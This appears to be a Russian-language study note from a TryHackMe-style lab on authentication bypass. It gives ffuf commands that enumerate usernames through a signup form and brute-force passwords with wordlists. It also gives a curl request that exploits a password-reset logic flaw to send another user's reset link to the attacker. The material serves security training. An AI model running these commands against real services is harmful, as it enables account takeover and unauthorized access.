# Обход аутентификации

Можно проанализировать с помощью регистрации нового пользователя мы можем увидеть что этот пользователь уже существует 
Это можно автаматизировать через ffuf
Вот пример команды: 
user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.67.160.135/customers/signup -mr "username already exists"

Теперь мы можем перебрать пароль с помощью команды 
user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.67.160.135/customers/login -fc 200

valid_usernames.txt это файл с именами пользователя который мы обнаружили командой ранее и после делаем брутфорс с помощью словаря паролей 

Логические ошибки аутентификации

Это пример ошибки аутентификации
вам потребуется создать учетную запись в разделе поддержки клиентов Acme IT. Это позволит вам получить уникальный адрес электронной почты, который можно использовать для создания заявок в службу поддержки. Адрес электронной почты имеет формат {username}@customer.acmeitsupport.thm
Теперь запустите запрос Curl Request 2 , но укажите @acmeitsupport.thm в поле электронной почты. В вашем аккаунте будет создан тикет, содержащий ссылку для входа в систему под именем Роберта. Используя аккаунт Роберта, вы сможете просмотреть его тикеты в службу поддержки и обнаружить флаг.

Запрос Curl (но с использованием вашей учетной записи @acmeitsupport.thm):

user@tryhackme:~$ curl 'http://10.67.160.135/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
